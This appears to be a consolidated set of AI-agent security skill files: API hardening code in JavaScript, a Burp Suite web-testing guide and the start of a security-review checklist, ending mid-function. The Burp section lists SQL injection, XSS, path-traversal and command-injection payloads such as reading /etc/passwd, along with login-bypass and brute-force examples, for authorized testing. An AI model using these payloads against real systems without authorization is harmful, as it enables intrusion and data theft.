# Security Consolidated Skills

## 📋 Table of Contents

- [Api Security Best Practices](#apisecuritybestpractices)
- [Burp Suite Testing](#burpsuitetesting)
- [Cc Skill Security Review](#ccskillsecurityreview)
- [Ethical Hacking Methodology](#ethicalhackingmethodology)
- [File Path Traversal](#filepathtraversal)
- [Idor Testing](#idortesting)
- [Metasploit Framework](#metasploitframework)
- [Pentest Checklist](#pentestchecklist)
- [Pentest Commands](#pentestcommands)
- [Red Team Tactics](#redteamtactics)
- [Red Team Tools](#redteamtools)
- [Smtp Penetration Testing](#smtppenetrationtesting)
- [Sql Injection Testing](#sqlinjectiontesting)
- [Sqlmap Database Pentesting](#sqlmapdatabasepentesting)
- [Ssh Penetration Testing](#sshpenetrationtesting)
- [Wireshark Analysis](#wiresharkanalysis)
- [Wordpress Penetration Testing](#wordpresspenetrationtesting)
- [Xss Html Injection](#xsshtmlinjection)

---

<a id="apisecuritybestpractices"></a>

## Api Security Best Practices

---
name: api-security-best-practices
description: "Implement secure API design patterns including authentication, authorization, input validation, rate limiting, and protection against common API vulnerabilities"
---

# API Security Best Practices

## Overview

Guide developers in building secure APIs by implementing authentication, authorization, input validation, rate limiting, and protection against common vulnerabilities. This skill covers security patterns for REST, GraphQL, and WebSocket APIs.

## When to Use This Skill

- Use when designing new API endpoints
- Use when securing existing APIs
- Use when implementing authentication and authorization
- Use when protecting against API attacks (injection, DDoS, etc.)
- Use when conducting API security reviews
- Use when preparing for security audits
- Use when implementing rate limiting and throttling
- Use when handling sensitive data in APIs

## How It Works

### Step 1: Authentication & Authorization

I'll help you implement secure authentication:
- Choose authentication method (JWT, OAuth 2.0, API keys)
- Implement token-based authentication
- Set up role-based access control (RBAC)
- Secure session management
- Implement multi-factor authentication (MFA)

### Step 2: Input Validation & Sanitization

Protect against injection attacks:
- Validate all input data
- Sanitize user inputs
- Use parameterized queries
- Implement request schema validation
- Prevent SQL injection, XSS, and command injection

### Step 3: Rate Limiting & Throttling

Prevent abuse and DDoS attacks:
- Implement rate limiting per user/IP
- Set up API throttling
- Configure request quotas
- Handle rate limit errors gracefully
- Monitor for suspicious activity

### Step 4: Data Protection

Secure sensitive data:
- Encrypt data in transit (HTTPS/TLS)
- Encrypt sensitive data at rest
- Implement proper error handling (no data leaks)
- Sanitize error messages
- Use secure headers

### Step 5: API Security Testing

Verify security implementation:
- Test authentication and authorization
- Perform penetration testing
- Check for common vulnerabilities (OWASP API Top 10)
- Validate input handling
- Test rate limiting


## Examples

### Example 1: Implementing JWT Authentication

```markdown
## Secure JWT Authentication Implementation

### Authentication Flow

1. User logs in with credentials
2. Server validates credentials
3. Server generates JWT token
4. Client stores token securely
5. Client sends token with each request
6. Server validates token

### Implementation

#### 1. Generate Secure JWT Tokens

\`\`\`javascript
// auth.js
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

// Login endpoint
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Validate input
    if (!email || !password) {
      return res.status(400).json({
        error: 'Email and password are required'
      });
    }

    // Find user
    const user = await db.user.findUnique({
      where: { email }
    });

    if (!user) {
      // Don't reveal if user exists
      return res.status(401).json({
        error: 'Invalid credentials'
      });
    }

    // Verify password
    const validPassword = await bcrypt.compare(
      password,
      user.passwordHash
    );

    if (!validPassword) {
      return res.status(401).json({
        error: 'Invalid credentials'
      });
    }

    // Generate JWT token
    const token = jwt.sign(
      {
        userId: user.id,
        email: user.email,
        role: user.role
      },
      process.env.JWT_SECRET,
      {
        expiresIn: '1h',
        issuer: 'your-app',
        audience: 'your-app-users'
      }
    );

    // Generate refresh token
    const refreshToken = jwt.sign(
      { userId: user.id },
      process.env.JWT_REFRESH_SECRET,
      { expiresIn: '7d' }
    );

    // Store refresh token in database
    await db.refreshToken.create({
      data: {
        token: refreshToken,
        userId: user.id,
        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
      }
    });

    res.json({
      token,
      refreshToken,
      expiresIn: 3600
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      error: 'An error occurred during login'
    });
  }
});
\`\`\`

#### 2. Verify JWT Tokens (Middleware)

\`\`\`javascript
// middleware/auth.js
const jwt = require('jsonwebtoken');

function authenticateToken(req, res, next) {
  // Get token from header
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

  if (!token) {
    return res.status(401).json({
      error: 'Access token required'
    });
  }

  // Verify token
  jwt.verify(
    token,
    process.env.JWT_SECRET,
    {
      issuer: 'your-app',
      audience: 'your-app-users'
    },
    (err, user) => {
      if (err) {
        if (err.name === 'TokenExpiredError') {
          return res.status(401).json({
            error: 'Token expired'
          });
        }
        return res.status(403).json({
          error: 'Invalid token'
        });
      }

      // Attach user to request
      req.user = user;
      next();
    }
  );
}

module.exports = { authenticateToken };
\`\`\`

#### 3. Protect Routes

\`\`\`javascript
const { authenticateToken } = require('./middleware/auth');

// Protected route
app.get('/api/user/profile', authenticateToken, async (req, res) => {
  try {
    const user = await db.user.findUnique({
      where: { id: req.user.userId },
      select: {
        id: true,
        email: true,
        name: true,
        // Don't return passwordHash
      }
    });

    res.json(user);
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});
\`\`\`

#### 4. Implement Token Refresh

\`\`\`javascript
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  if (!refreshToken) {
    return res.status(401).json({
      error: 'Refresh token required'
    });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(
      refreshToken,
      process.env.JWT_REFRESH_SECRET
    );

    // Check if refresh token exists in database
    const storedToken = await db.refreshToken.findFirst({
      where: {
        token: refreshToken,
        userId: decoded.userId,
        expiresAt: { gt: new Date() }
      }
    });

    if (!storedToken) {
      return res.status(403).json({
        error: 'Invalid refresh token'
      });
    }

    // Generate new access token
    const user = await db.user.findUnique({
      where: { id: decoded.userId }
    });

    const newToken = jwt.sign(
      {
        userId: user.id,
        email: user.email,
        role: user.role
      },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );

    res.json({
      token: newToken,
      expiresIn: 3600
    });

  } catch (error) {
    res.status(403).json({
      error: 'Invalid refresh token'
    });
  }
});
\`\`\`

### Security Best Practices

- ✅ Use strong JWT secrets (256-bit minimum)
- ✅ Set short expiration times (1 hour for access tokens)
- ✅ Implement refresh tokens for long-lived sessions
- ✅ Store refresh tokens in database (can be revoked)
- ✅ Use HTTPS only
- ✅ Don't store sensitive data in JWT payload
- ✅ Validate token issuer and audience
- ✅ Implement token blacklisting for logout
```


### Example 2: Input Validation and SQL Injection Prevention

```markdown
## Preventing SQL Injection and Input Validation

### The Problem

**❌ Vulnerable Code:**
\`\`\`javascript
// NEVER DO THIS - SQL Injection vulnerability
app.get('/api/users/:id', async (req, res) => {
  const userId = req.params.id;

  // Dangerous: User input directly in query
  const query = \`SELECT * FROM users WHERE id = '\${userId}'\`;
  const user = await db.query(query);

  res.json(user);
});

// Attack example:
// GET /api/users/1' OR '1'='1
// Returns all users!
\`\`\`

### The Solution

#### 1. Use Parameterized Queries

\`\`\`javascript
// ✅ Safe: Parameterized query
app.get('/api/users/:id', async (req, res) => {
  const userId = req.params.id;

  // Validate input first
  if (!userId || !/^\d+$/.test(userId)) {
    return res.status(400).json({
      error: 'Invalid user ID'
    });
  }

  // Use parameterized query
  const user = await db.query(
    'SELECT id, email, name FROM users WHERE id = $1',
    [userId]
  );

  if (!user) {
    return res.status(404).json({
      error: 'User not found'
    });
  }

  res.json(user);
});
\`\`\`

#### 2. Use ORM with Proper Escaping

\`\`\`javascript
// ✅ Safe: Using Prisma ORM
app.get('/api/users/:id', async (req, res) => {
  const userId = parseInt(req.params.id);

  if (isNaN(userId)) {
    return res.status(400).json({
      error: 'Invalid user ID'
    });
  }

  const user = await prisma.user.findUnique({
    where: { id: userId },
    select: {
      id: true,
      email: true,
      name: true,
      // Don't select sensitive fields
    }
  });

  if (!user) {
    return res.status(404).json({
      error: 'User not found'
    });
  }

  res.json(user);
});
\`\`\`

#### 3. Implement Request Validation with Zod

\`\`\`javascript
const { z } = require('zod');

// Define validation schema
const createUserSchema = z.object({
  email: z.string().email('Invalid email format'),
  password: z.string()
    .min(8, 'Password must be at least 8 characters')
    .regex(/[A-Z]/, 'Password must contain uppercase letter')
    .regex(/[a-z]/, 'Password must contain lowercase letter')
    .regex(/[0-9]/, 'Password must contain number'),
  name: z.string()
    .min(2, 'Name must be at least 2 characters')
    .max(100, 'Name too long'),
  age: z.number()
    .int('Age must be an integer')
    .min(18, 'Must be 18 or older')
    .max(120, 'Invalid age')
    .optional()
});

// Validation middleware
function validateRequest(schema) {
  return (req, res, next) => {
    try {
      schema.parse(req.body);
      next();
    } catch (error) {
      res.status(400).json({
        error: 'Validation failed',
        details: error.errors
      });
    }
  };
}

// Use validation
app.post('/api/users',
  validateRequest(createUserSchema),
  async (req, res) => {
    // Input is validated at this point
    const { email, password, name, age } = req.body;

    // Hash password
    const passwordHash = await bcrypt.hash(password, 10);

    // Create user
    const user = await prisma.user.create({
      data: {
        email,
        passwordHash,
        name,
        age
      }
    });

    // Don't return password hash
    const { passwordHash: _, ...userWithoutPassword } = user;
    res.status(201).json(userWithoutPassword);
  }
);
\`\`\`

#### 4. Sanitize Output to Prevent XSS

\`\`\`javascript
const DOMPurify = require('isomorphic-dompurify');

app.post('/api/comments', authenticateToken, async (req, res) => {
  const { content } = req.body;

  // Validate
  if (!content || content.length > 1000) {
    return res.status(400).json({
      error: 'Invalid comment content'
    });
  }

  // Sanitize HTML to prevent XSS
  const sanitizedContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });

  const comment = await prisma.comment.create({
    data: {
      content: sanitizedContent,
      userId: req.user.userId
    }
  });

  res.status(201).json(comment);
});
\`\`\`

### Validation Checklist

- [ ] Validate all user inputs
- [ ] Use parameterized queries or ORM
- [ ] Validate data types (string, number, email, etc.)
- [ ] Validate data ranges (min/max length, value ranges)
- [ ] Sanitize HTML content
- [ ] Escape special characters
- [ ] Validate file uploads (type, size, content)
- [ ] Use allowlists, not blocklists
```


### Example 3: Rate Limiting and DDoS Protection

```markdown
## Implementing Rate Limiting

### Why Rate Limiting?

- Prevent brute force attacks
- Protect against DDoS
- Prevent API abuse
- Ensure fair usage
- Reduce server costs

### Implementation with Express Rate Limit

\`\`\`javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const Redis = require('ioredis');

// Create Redis client
const redis = new Redis({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT
});

// General API rate limit
const apiLimiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rl:api:'
  }),
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  message: {
    error: 'Too many requests, please try again later',
    retryAfter: 900 // seconds
  },
  standardHeaders: true, // Return rate limit info in headers
  legacyHeaders: false,
  // Custom key generator (by user ID or IP)
  keyGenerator: (req) => {
    return req.user?.userId || req.ip;
  }
});

// Strict rate limit for authentication endpoints
const authLimiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rl:auth:'
  }),
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Only 5 login attempts per 15 minutes
  skipSuccessfulRequests: true, // Don't count successful logins
  message: {
    error: 'Too many login attempts, please try again later',
    retryAfter: 900
  }
});

// Apply rate limiters
app.use('/api/', apiLimiter);
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/register', authLimiter);

// Custom rate limiter for expensive operations
const expensiveLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 10, // 10 requests per hour
  message: {
    error: 'Rate limit exceeded for this operation'
  }
});

app.post('/api/reports/generate',
  authenticateToken,
  expensiveLimiter,
  async (req, res) => {
    // Expensive operation
  }
);
\`\`\`

### Advanced: Per-User Rate Limiting

\`\`\`javascript
// Different limits based on user tier
function createTieredRateLimiter() {
  const limits = {
    free: { windowMs: 60 * 60 * 1000, max: 100 },
    pro: { windowMs: 60 * 60 * 1000, max: 1000 },
    enterprise: { windowMs: 60 * 60 * 1000, max: 10000 }
  };

  return async (req, res, next) => {
    const user = req.user;
    const tier = user?.tier || 'free';
    const limit = limits[tier];

    const key = \`rl:user:\${user.userId}\`;
    const current = await redis.incr(key);

    if (current === 1) {
      await redis.expire(key, limit.windowMs / 1000);
    }

    if (current > limit.max) {
      return res.status(429).json({
        error: 'Rate limit exceeded',
        limit: limit.max,
        remaining: 0,
        reset: await redis.ttl(key)
      });
    }

    // Set rate limit headers
    res.set({
      'X-RateLimit-Limit': limit.max,
      'X-RateLimit-Remaining': limit.max - current,
      'X-RateLimit-Reset': await redis.ttl(key)
    });

    next();
  };
}

app.use('/api/', authenticateToken, createTieredRateLimiter());
\`\`\`

### DDoS Protection with Helmet

\`\`\`javascript
const helmet = require('helmet');

app.use(helmet({
  // Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", 'data:', 'https:']
    }
  },
  // Prevent clickjacking
  frameguard: { action: 'deny' },
  // Hide X-Powered-By header
  hidePoweredBy: true,
  // Prevent MIME type sniffing
  noSniff: true,
  // Enable HSTS
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
\`\`\`

### Rate Limit Response Headers

\`\`\`
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 87
X-RateLimit-Reset: 1640000000
Retry-After: 900
\`\`\`
```

## Best Practices

### ✅ Do This

- **Use HTTPS Everywhere** - Never send sensitive data over HTTP
- **Implement Authentication** - Require authentication for protected endpoints
- **Validate All Inputs** - Never trust user input
- **Use Parameterized Queries** - Prevent SQL injection
- **Implement Rate Limiting** - Protect against brute force and DDoS
- **Hash Passwords** - Use bcrypt with salt rounds >= 10
- **Use Short-Lived Tokens** - JWT access tokens should expire quickly
- **Implement CORS Properly** - Only allow trusted origins
- **Log Security Events** - Monitor for suspicious activity
- **Keep Dependencies Updated** - Regularly update packages
- **Use Security Headers** - Implement Helmet.js
- **Sanitize Error Messages** - Don't leak sensitive information

### ❌ Don't Do This

- **Don't Store Passwords in Plain Text** - Always hash passwords
- **Don't Use Weak Secrets** - Use strong, random JWT secrets
- **Don't Trust User Input** - Always validate and sanitize
- **Don't Expose Stack Traces** - Hide error details in production
- **Don't Use String Concatenation for SQL** - Use parameterized queries
- **Don't Store Sensitive Data in JWT** - JWTs are not encrypted
- **Don't Ignore Security Updates** - Update dependencies regularly
- **Don't Use Default Credentials** - Change all default passwords
- **Don't Disable CORS Completely** - Configure it properly instead
- **Don't Log Sensitive Data** - Sanitize logs

## Common Pitfalls

### Problem: JWT Secret Exposed in Code
**Symptoms:** JWT secret hardcoded or committed to Git
**Solution:**
\`\`\`javascript
// ❌ Bad
const JWT_SECRET = 'my-secret-key';

// ✅ Good
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) {
  throw new Error('JWT_SECRET environment variable is required');
}

// Generate strong secret
// node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
\`\`\`

### Problem: Weak Password Requirements
**Symptoms:** Users can set weak passwords like "password123"
**Solution:**
\`\`\`javascript
const passwordSchema = z.string()
  .min(12, 'Password must be at least 12 characters')
  .regex(/[A-Z]/, 'Must contain uppercase letter')
  .regex(/[a-z]/, 'Must contain lowercase letter')
  .regex(/[0-9]/, 'Must contain number')
  .regex(/[^A-Za-z0-9]/, 'Must contain special character');

// Or use a password strength library
const zxcvbn = require('zxcvbn');
const result = zxcvbn(password);
if (result.score < 3) {
  return res.status(400).json({
    error: 'Password too weak',
    suggestions: result.feedback.suggestions
  });
}
\`\`\`

### Problem: Missing Authorization Checks
**Symptoms:** Users can access resources they shouldn't
**Solution:**
\`\`\`javascript
// ❌ Bad: Only checks authentication
app.delete('/api/posts/:id', authenticateToken, async (req, res) => {
  await prisma.post.delete({ where: { id: req.params.id } });
  res.json({ success: true });
});

// ✅ Good: Checks both authentication and authorization
app.delete('/api/posts/:id', authenticateToken, async (req, res) => {
  const post = await prisma.post.findUnique({
    where: { id: req.params.id }
  });

  if (!post) {
    return res.status(404).json({ error: 'Post not found' });
  }

  // Check if user owns the post or is admin
  if (post.userId !== req.user.userId && req.user.role !== 'admin') {
    return res.status(403).json({
      error: 'Not authorized to delete this post'
    });
  }

  await prisma.post.delete({ where: { id: req.params.id } });
  res.json({ success: true });
});
\`\`\`

### Problem: Verbose Error Messages
**Symptoms:** Error messages reveal system details
**Solution:**
\`\`\`javascript
// ❌ Bad: Exposes database details
app.post('/api/users', async (req, res) => {
  try {
    const user = await prisma.user.create({ data: req.body });
    res.json(user);
  } catch (error) {
    res.status(500).json({ error: error.message });
    // Error: "Unique constraint failed on the fields: (`email`)"
  }
});

// ✅ Good: Generic error message
app.post('/api/users', async (req, res) => {
  try {
    const user = await prisma.user.create({ data: req.body });
    res.json(user);
  } catch (error) {
    console.error('User creation error:', error); // Log full error

    if (error.code === 'P2002') {
      return res.status(400).json({
        error: 'Email already exists'
      });
    }

    res.status(500).json({
      error: 'An error occurred while creating user'
    });
  }
});
\`\`\`

## Security Checklist

### Authentication & Authorization
- [ ] Implement strong authentication (JWT, OAuth 2.0)
- [ ] Use HTTPS for all endpoints
- [ ] Hash passwords with bcrypt (salt rounds >= 10)
- [ ] Implement token expiration
- [ ] Add refresh token mechanism
- [ ] Verify user authorization for each request
- [ ] Implement role-based access control (RBAC)

### Input Validation
- [ ] Validate all user inputs
- [ ] Use parameterized queries or ORM
- [ ] Sanitize HTML content
- [ ] Validate file uploads
- [ ] Implement request schema validation
- [ ] Use allowlists, not blocklists

### Rate Limiting & DDoS Protection
- [ ] Implement rate limiting per user/IP
- [ ] Add stricter limits for auth endpoints
- [ ] Use Redis for distributed rate limiting
- [ ] Return proper rate limit headers
- [ ] Implement request throttling

### Data Protection
- [ ] Use HTTPS/TLS for all traffic
- [ ] Encrypt sensitive data at rest
- [ ] Don't store sensitive data in JWT
- [ ] Sanitize error messages
- [ ] Implement proper CORS configuration
- [ ] Use security headers (Helmet.js)

### Monitoring & Logging
- [ ] Log security events
- [ ] Monitor for suspicious activity
- [ ] Set up alerts for failed auth attempts
- [ ] Track API usage patterns
- [ ] Don't log sensitive data

## OWASP API Security Top 10

1. **Broken Object Level Authorization** - Always verify user can access resource
2. **Broken Authentication** - Implement strong authentication mechanisms
3. **Broken Object Property Level Authorization** - Validate which properties user can access
4. **Unrestricted Resource Consumption** - Implement rate limiting and quotas
5. **Broken Function Level Authorization** - Verify user role for each function
6. **Unrestricted Access to Sensitive Business Flows** - Protect critical workflows
7. **Server Side Request Forgery (SSRF)** - Validate and sanitize URLs
8. **Security Misconfiguration** - Use security best practices and headers
9. **Improper Inventory Management** - Document and secure all API endpoints
10. **Unsafe Consumption of APIs** - Validate data from third-party APIs

## Related Skills

- `@ethical-hacking-methodology` - Security testing perspective
- `@sql-injection-testing` - Testing for SQL injection
- `@xss-html-injection` - Testing for XSS vulnerabilities
- `@broken-authentication` - Authentication vulnerabilities
- `@backend-dev-guidelines` - Backend development standards
- `@systematic-debugging` - Debug security issues

## Additional Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [Node.js Security Checklist](https://blog.risingstack.com/node-js-security-checklist/)
- [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)

---

**Pro Tip:** Security is not a one-time task - regularly audit your APIs, keep dependencies updated, and stay informed about new vulnerabilities!


---

<a id="burpsuitetesting"></a>

## Burp Suite Testing

---
name: Burp Suite Web Application Testing
description: This skill should be used when the user asks to "intercept HTTP traffic", "modify web requests", "use Burp Suite for testing", "perform web vulnerability scanning", "test with Burp Repeater", "analyze HTTP history", or "configure proxy for web testing". It provides comprehensive guidance for using Burp Suite's core features for web application security testing.
metadata:
  author: zebbern
  version: "1.1"
---

# Burp Suite Web Application Testing

## Purpose

Execute comprehensive web application security testing using Burp Suite's integrated toolset, including HTTP traffic interception and modification, request analysis and replay, automated vulnerability scanning, and manual testing workflows. This skill enables systematic discovery and exploitation of web application vulnerabilities through proxy-based testing methodology.

## Inputs / Prerequisites

### Required Tools
- Burp Suite Community or Professional Edition installed
- Burp's embedded browser or configured external browser
- Target web application URL
- Valid credentials for authenticated testing (if applicable)

### Environment Setup
- Burp Suite launched with temporary or named project
- Proxy listener active on 127.0.0.1:8080 (default)
- Browser configured to use Burp proxy (or use Burp's browser)
- CA certificate installed for HTTPS interception

### Editions Comparison
| Feature | Community | Professional |
|---------|-----------|--------------|
| Proxy | ✓ | ✓ |
| Repeater | ✓ | ✓ |
| Intruder | Limited | Full |
| Scanner | ✗ | ✓ |
| Extensions | ✓ | ✓ |

## Outputs / Deliverables

### Primary Outputs
- Intercepted and modified HTTP requests/responses
- Vulnerability scan reports with remediation advice
- HTTP history and site map documentation
- Proof-of-concept exploits for identified vulnerabilities

## Core Workflow

### Phase 1: Intercepting HTTP Traffic

#### Launch Burp's Browser
Navigate to integrated browser for seamless proxy integration:

1. Open Burp Suite and create/open project
2. Go to **Proxy > Intercept** tab
3. Click **Open Browser** to launch preconfigured browser
4. Position windows to view both Burp and browser simultaneously

#### Configure Interception
Control which requests are captured:

```
Proxy > Intercept > Intercept is on/off toggle

When ON: Requests pause for review/modification
When OFF: Requests pass through, logged to history
```

#### Intercept and Forward Requests
Process intercepted traffic:

1. Set intercept toggle to **Intercept on**
2. Navigate to target URL in browser
3. Observe request held in Proxy > Intercept tab
4. Review request contents (headers, parameters, body)
5. Click **Forward** to send request to server
6. Continue forwarding subsequent requests until page loads

#### View HTTP History
Access complete traffic log:

1. Go to **Proxy > HTTP history** tab
2. Click any entry to view full request/response
3. Sort by clicking column headers (# for chronological order)
4. Use filters to focus on relevant traffic

### Phase 2: Modifying Requests

#### Intercept and Modify
Change request parameters before forwarding:

1. Enable interception: **Intercept on**
2. Trigger target request in browser
3. Locate parameter to modify in intercepted request
4. Edit value directly in request editor
5. Click **Forward** to send modified request

#### Common Modification Targets
| Target | Example | Purpose |
|--------|---------|---------|
| Price parameters | `price=1` | Test business logic |
| User IDs | `userId=admin` | Test access control |
| Quantity values | `qty=-1` | Test input validation |
| Hidden fields | `isAdmin=true` | Test privilege escalation |

#### Example: Price Manipulation

```http
POST /cart HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1&price=100

# Modify to:
productId=1&quantity=1&price=1
```

Result: Item added to cart at modified price.

### Phase 3: Setting Target Scope

#### Define Scope
Focus testing on specific target:

1. Go to **Target > Site map**
2. Right-click target host in left panel
3. Select **Add to scope**
4. When prompted, click **Yes** to exclude out-of-scope traffic

#### Filter by Scope
Remove noise from HTTP history:

1. Click display filter above HTTP history
2. Select **Show only in-scope items**
3. History now shows only target site traffic

#### Scope Benefits
- Reduces clutter from third-party requests
- Prevents accidental testing of out-of-scope sites
- Improves scanning efficiency
- Creates cleaner reports

### Phase 4: Using Burp Repeater

#### Send Request to Repeater
Prepare request for manual testing:

1. Identify interesting request in HTTP history
2. Right-click request and select **Send to Repeater**
3. Go to **Repeater** tab to access request

#### Modify and Resend
Test different inputs efficiently:

```
1. View request in Repeater tab
2. Modify parameter values
3. Click Send to submit request
4. Review response in right panel
5. Use navigation arrows to review request history
```

#### Repeater Testing Workflow

```
Original Request:
GET /product?productId=1 HTTP/1.1

Test 1: productId=2    → Valid product response
Test 2: productId=999  → Not Found response
Test 3: productId='    → Error/exception response
Test 4: productId=1 OR 1=1 → SQL injection test
```

#### Analyze Responses
Look for indicators of vulnerabilities:

- Error messages revealing stack traces
- Framework/version information disclosure
- Different response lengths indicating logic flaws
- Timing differences suggesting blind injection
- Unexpected data in responses

### Phase 5: Running Automated Scans

#### Launch New Scan
Initiate vulnerability scanning (Professional only):

1. Go to **Dashboard** tab
2. Click **New scan**
3. Enter target URL in **URLs to scan** field
4. Configure scan settings

#### Scan Configuration Options

| Mode | Description | Duration |
|------|-------------|----------|
| Lightweight | High-level overview | ~15 minutes |
| Fast | Quick vulnerability check | ~30 minutes |
| Balanced | Standard comprehensive scan | ~1-2 hours |
| Deep | Thorough testing | Several hours |

#### Monitor Scan Progress
Track scanning activity:

1. View task status in **Dashboard**
2. Watch **Target > Site map** update in real-time
3. Check **Issues** tab for discovered vulnerabilities

#### Review Identified Issues
Analyze scan findings:

1. Select scan task in Dashboard
2. Go to **Issues** tab
3. Click issue to view:
   - **Advisory**: Description and remediation
   - **Request**: Triggering HTTP request
   - **Response**: Server response showing vulnerability

### Phase 6: Intruder Attacks

#### Configure Intruder
Set up automated attack:

1. Send request to Intruder (right-click > Send to Intruder)
2. Go to **Intruder** tab
3. Define payload positions using § markers
4. Select attack type

#### Attack Types

| Type | Description | Use Case |
|------|-------------|----------|
| Sniper | Single position, iterate payloads | Fuzzing one parameter |
| Battering ram | Same payload all positions | Credential testing |
| Pitchfork | Parallel payload iteration | Username:password pairs |
| Cluster bomb | All payload combinations | Full brute force |

#### Configure Payloads

```
Positions Tab:
POST /login HTTP/1.1
...
username=§admin§&password=§password§

Payloads Tab:
Set 1: admin, user, test, guest
Set 2: password, 123456, admin, letmein
```

#### Analyze Results
Review attack output:

- Sort by response length to find anomalies
- Filter by status code for successful attempts
- Use grep to search for specific strings
- Export results for documentation

## Quick Reference

### Keyboard Shortcuts
| Action | Windows/Linux | macOS |
|--------|---------------|-------|
| Forward request | Ctrl+F | Cmd+F |
| Drop request | Ctrl+D | Cmd+D |
| Send to Repeater | Ctrl+R | Cmd+R |
| Send to Intruder | Ctrl+I | Cmd+I |
| Toggle intercept | Ctrl+T | Cmd+T |

### Common Testing Payloads

```
# SQL Injection
' OR '1'='1
' OR '1'='1'--
1 UNION SELECT NULL--

# XSS
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(1)

# Path Traversal
../../../etc/passwd
..\..\..\..\windows\win.ini

# Command Injection
; ls -la
| cat /etc/passwd
`whoami`
```

### Request Modification Tips
- Right-click for context menu options
- Use decoder for encoding/decoding
- Compare requests using Comparer tool
- Save interesting requests to project

## Constraints and Guardrails

### Operational Boundaries
- Test only authorized applications
- Configure scope to prevent accidental out-of-scope testing
- Rate-limit scans to avoid denial of service
- Document all findings and actions

### Technical Limitations
- Community Edition lacks automated scanner
- Some sites may block proxy traffic
- HSTS/certificate pinning may require additional configuration
- Heavy scanning may trigger WAF blocks

### Best Practices
- Always set target scope before extensive testing
- Use Burp's browser for reliable interception
- Save project regularly to preserve work
- Review scan results manually for false positives

## Examples

### Example 1: Business Logic Testing

**Scenario**: E-commerce price manipulation

1. Add item to cart normally, intercept request
2. Identify `price=9999` parameter in POST body
3. Modify to `price=1`
4. Forward request
5. Complete checkout at manipulated price

**Finding**: Server trusts client-provided price values.

### Example 2: Authentication Bypass

**Scenario**: Testing login form

1. Submit valid credentials, capture request in Repeater
2. Send to Repeater for testing
3. Try: `username=admin' OR '1'='1'--`
4. Observe successful login response

**Finding**: SQL injection in authentication.

### Example 3: Information Disclosure

**Scenario**: Error-based information gathering

1. Navigate to product page, observe `productId` parameter
2. Send request to Repeater
3. Change `productId=1` to `productId=test`
4. Observe verbose error revealing framework version

**Finding**: Apache Struts 2.5.12 disclosed in stack trace.

## Troubleshooting

### Browser Not Connecting Through Proxy
- Verify proxy listener is active (Proxy > Options)
- Check browser proxy settings point to 127.0.0.1:8080
- Ensure no firewall blocking local connections
- Use Burp's embedded browser for reliable setup

### HTTPS Interception Failing
- Install Burp CA certificate in browser/system
- Navigate to http://burp to download certificate
- Add certificate to trusted roots
- Restart browser after installation

### Slow Performance
- Limit scope to reduce processing
- Disable unnecessary extensions
- Increase Java heap size in startup options
- Close unused Burp tabs and features

### Requests Not Being Intercepted
- Verify "Intercept on" is enabled
- Check intercept rules aren't filtering target
- Ensure browser is using Burp proxy
- Verify target isn't using unsupported protocol


---

<a id="ccskillsecurityreview"></a>

## Cc Skill Security Review

---
name: security-review
description: Use this skill when adding authentication, handling user input, working with secrets, creating API endpoints, or implementing payment/sensitive features. Provides comprehensive security checklist and patterns.
author: affaan-m
version: "1.0"
---

# Security Review Skill

This skill ensures all code follows security best practices and identifies potential vulnerabilities.

## When to Activate

- Implementing authentication or authorization
- Handling user input or file uploads
- Creating new API endpoints
- Working with secrets or credentials
- Implementing payment features
- Storing or transmitting sensitive data
- Integrating third-party APIs

## Security Checklist

### 1. Secrets Management

#### ❌ NEVER Do This
```typescript
const apiKey = "sk-proj-xxxxx"  // Hardcoded secret
const dbPassword = "password123" // In source code
```

#### ✅ ALWAYS Do This
```typescript
const apiKey = process.env.OPENAI_API_KEY
const dbUrl = process.env.DATABASE_URL

// Verify secrets exist
if (!apiKey) {
  throw new Error('OPENAI_API_KEY not configured')
}
```

#### Verification Steps
- [ ] No hardcoded API keys, tokens, or passwords
- [ ] All secrets in environment variables
- [ ] `.env.local` in .gitignore
- [ ] No secrets in git history
- [ ] Production secrets in hosting platform (Vercel, Railway)

### 2. Input Validation

#### Always Validate User Input
```typescript
import { z } from 'zod'

// Define validation schema
const CreateUserSchema = z.object({
  email: z.string().email(),
  name: z.string().min(1).max(100),
  age: z.number().int().min(0).max(150)
})

// Validate before processing
export async function createUser(input: unknown) {
  try {
    const validated = CreateUserSchema.parse(input)
    return await db.users.create(validated)
  } catch (error) {
    if (error instanceof z.ZodError) {
      return { success: false, errors: error.errors }
    }
    throw error
  }
}
```

#### File Upload Validation
```typescript
function validateFileUpload(file: File) {
  // Size check (5MB max)
